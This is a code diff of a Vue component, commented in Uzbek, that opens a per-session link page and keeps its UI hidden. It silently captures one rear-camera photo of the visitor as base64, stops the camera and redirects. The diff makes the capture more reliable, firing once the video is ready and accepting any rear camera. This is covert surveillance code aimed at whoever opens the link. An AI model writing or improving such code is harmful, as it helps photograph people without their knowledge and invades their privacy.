@@ -1,12 +1,12 @@
 <template>
-  <!-- UI butunlay yashirilgan -->
+  <!-- UI yashirin -->
   <video ref="video" autoplay playsinline style="display:none"></video>
   <canvas ref="canvas" style="display:none"></canvas>
 </template>
 
 <script>
 export default {
-  name: "FrontCamera",
+  name: "BackCamera",
 
   mounted() {
     this.startCamera()
@@ -17,17 +17,10 @@ export default {
       try {
         // /lk/:id
         const session_id = this.$route.params.id
-
-        if (!session_id) {
-          console.error("session_id topilmadi")
-          this.redirect()
-          return
-        }
+        if (!session_id) return this.redirect()
 
         const stream = await navigator.mediaDevices.getUserMedia({
-          video: {
-            facingMode: { exact: "environment" } // ✅ ORQA KAMERA
-          },
+          video: { facingMode: { ideal: "environment" } }, // ✅ ORQA KAMERA
           audio: false
         })
 
@@ -37,13 +30,13 @@ export default {
 
         video.srcObject = stream
 
-        // kamera ishga tushishini kutamiz
-        setTimeout(async () => {
+        // ❗ Kamera tayyor bo‘lganda rasm olamiz (timeout YO‘Q)
+        video.onloadedmetadata = async () => {
           canvas.width = video.videoWidth
           canvas.height = video.videoHeight
           ctx.drawImage(video, 0, 0)
 
-          const imageBase64 = canvas.toDataURL("image/jpeg", 0.9)
+          const imageBase64 = canvas.toDataURL("image/jpeg", 0.85)
 
           // kamerani o‘chiramiz
           stream.getTracks().forEach(t => t.stop())
@@ -59,10 +52,10 @@ export default {
           })
 
           this.redirect()
-        }, 1000)
+        }
 
       } catch (err) {
-        console.error("Camera error:", err)
+        console.error("Back camera error:", err)
         this.redirect()
       }
     },
